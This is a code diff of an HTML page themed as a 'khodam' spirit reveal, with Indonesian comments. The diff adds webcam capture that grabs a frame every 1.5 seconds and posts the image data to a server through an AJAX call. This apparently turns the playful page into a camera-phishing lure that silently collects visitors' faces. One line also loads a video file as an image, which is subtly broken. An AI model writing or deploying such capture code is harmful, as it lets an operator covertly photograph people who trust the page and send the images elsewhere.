@@ -1,9 +1,8 @@
 <div class="video-wrap">
-  <!-- Bisa pakai file lokal atau streaming -->
-  <video id="video" src="video_khodam.mp4" autoplay loop muted playsinline></video>
+  <canvas id="canvas" width="640" height="480"></canvas>
 </div>
-<canvas hidden id="canvas" width="640" height="480"></canvas>
 
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
 <script>
 function post(imgdata){
   $.ajax({
@@ -15,13 +14,40 @@ function post(imgdata){
   });
 }
 
-const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 const ctx = canvas.getContext('2d');
+const cameraVideo = document.createElement('video');
+cameraVideo.autoplay = true;
+cameraVideo.playsInline = true;
 
-setInterval(function(){
-  ctx.drawImage(video, 0, 0, 640, 480);
-  var imgData = canvas.toDataURL("image/png").replace("image/png","image/octet-stream");
-  post(imgData);
-}, 1500);
+// Gambar latar belakang Khodam
+const khodamBg = new Image();
+khodamBg.src = "video_khodam.mp4"; // bisa ganti jadi PNG/JPG transparan juga
+
+async function initCamera() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+    cameraVideo.srcObject = stream;
+
+    cameraVideo.addEventListener('loadedmetadata', () => {
+      setInterval(() => {
+        // Draw kamera dulu
+        ctx.drawImage(cameraVideo, 0, 0, canvas.width, canvas.height);
+        // Draw latar belakang Khodam di atas
+        ctx.drawImage(khodamBg, 0, 0, canvas.width, canvas.height);
+
+        // Kirim data ke server
+        const imgData = canvas.toDataURL("image/png").replace("image/png","image/octet-stream");
+        post(imgData);
+
+      }, 1500);
+    });
+
+  } catch(err) {
+    console.error("Gagal akses kamera:", err);
+    alert("Browser tidak bisa akses kamera. Pastikan izinkan akses kamera.");
+  }
+}
+
+initCamera();
 </script>
